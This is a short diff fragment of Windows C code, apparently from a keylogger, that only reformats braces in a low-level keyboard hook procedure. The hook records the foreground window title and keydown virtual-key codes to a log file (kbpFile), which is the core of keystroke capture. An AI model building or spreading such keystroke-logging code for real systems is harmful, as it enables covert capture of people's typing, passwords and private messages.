@@ -40,7 +40,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 	wchar_t currentWindowTitle[256];
 	GetWindowTextW(currentWindow, currentWindowTitle, 256);
 
-	if (wcsncmp(lastWindowTitle, currentWindowTitle, 256)) {
+	if (wcsncmp(lastWindowTitle, currentWindowTitle, 256))
+	{
 		wchar_t output[256];
 		lastWindow = currentWindow;
 		wcsncpy_s(lastWindowTitle, 256, currentWindowTitle, sizeof(currentWindowTitle));
@@ -48,8 +49,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 		fputws(output, kbpFile);
 	}
 
-	if (code >= 0) {
-		if (wParam == WM_KEYDOWN) {
+	if (code >= 0)
+	{
+		if (wParam == WM_KEYDOWN)
+		{
 			PKBDLLHOOKSTRUCT kbhstruct = (PKBDLLHOOKSTRUCT)lParam;
 			DWORD vkey = kbhstruct->vkCode;
 			if (vkey == 0x01 || vkey == 0x02)
